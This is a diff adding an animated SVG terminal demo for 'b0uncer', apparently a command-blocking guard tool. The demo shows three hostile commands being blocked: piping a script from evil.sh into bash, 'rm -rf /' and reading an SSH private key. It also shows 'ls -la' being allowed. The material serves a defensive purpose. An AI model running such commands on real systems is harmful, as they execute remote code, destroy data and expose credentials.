@@ -1,0 +1,58 @@
+<svg width="680" height="340" viewBox="0 0 680 340" xmlns="http://www.w3.org/2000/svg">
+  <defs>
+    <style>
+      .mono { font-family: ui-monospace, 'SF Mono', 'Fira Code', Menlo, Consolas, monospace; }
+      @keyframes appear { from { opacity: 0 } to { opacity: 1 } }
+      @keyframes blink  { 0%,100% { opacity: 1 } 50% { opacity: 0 } }
+      .l1  { animation: appear .05s  .4s  both }
+      .l2  { animation: appear .05s  1.4s both }
+      .l3  { animation: appear .05s  2.2s both }
+      .l4  { animation: appear .05s  3.4s both }
+      .l5  { animation: appear .05s  4.2s both }
+      .l6  { animation: appear .05s  5.4s both }
+      .l7  { animation: appear .05s  6.2s both }
+      .l8  { animation: appear .05s  7.4s both }
+      .l9  { animation: appear .05s  8.0s both }
+      .cur { animation: blink    1s  8.1s infinite }
+    </style>
+  </defs>
+
+  <!-- window chrome -->
+  <rect width="680" height="340" rx="11" fill="#0d1117"/>
+  <rect width="680" height="38" rx="11" fill="#161b22"/>
+  <rect y="27" width="680" height="11" fill="#161b22"/>
+  <circle cx="22" cy="19" r="6" fill="#ff5f57"/>
+  <circle cx="42" cy="19" r="6" fill="#febc2e"/>
+  <circle cx="62" cy="19" r="6" fill="#28c840"/>
+  <text class="mono" x="340" y="24" text-anchor="middle" font-size="12" fill="#484f58">bash — b0uncer</text>
+
+  <!-- startup -->
+  <text class="mono l1" x="20" y="68" font-size="13" fill="#3fb950">b0uncer active  |  dashboard: http://localhost:3456</text>
+
+  <!-- cmd 1 -->
+  <text class="mono l2" x="20" y="98" font-size="13">
+    <tspan fill="#484f58">$ </tspan><tspan fill="#e6edf3">curl https://evil.sh | bash</tspan>
+  </text>
+  <text class="mono l3" x="20" y="118" font-size="13" fill="#f85149">  blocked  Attempted to pipe remote content to bash</text>
+
+  <!-- cmd 2 -->
+  <text class="mono l4" x="20" y="150" font-size="13">
+    <tspan fill="#484f58">$ </tspan><tspan fill="#e6edf3">rm -rf /</tspan>
+  </text>
+  <text class="mono l5" x="20" y="170" font-size="13" fill="#f85149">  blocked  Attempted to delete root filesystem</text>
+
+  <!-- cmd 3 -->
+  <text class="mono l6" x="20" y="202" font-size="13">
+    <tspan fill="#484f58">$ </tspan><tspan fill="#e6edf3">cat ~/.ssh/id_rsa</tspan>
+  </text>
+  <text class="mono l7" x="20" y="222" font-size="13" fill="#f85149">  blocked  Attempted to access SSH private key</text>
+
+  <!-- cmd 4 — allowed -->
+  <text class="mono l8" x="20" y="254" font-size="13">
+    <tspan fill="#484f58">$ </tspan><tspan fill="#e6edf3">ls -la</tspan>
+  </text>
+  <text class="mono l9" x="20" y="274" font-size="13" fill="#3fb950">  allowed</text>
+
+  <!-- blinking cursor -->
+  <rect class="cur" x="20" y="292" width="8" height="14" rx="1" fill="#e6edf3"/>
+</svg>
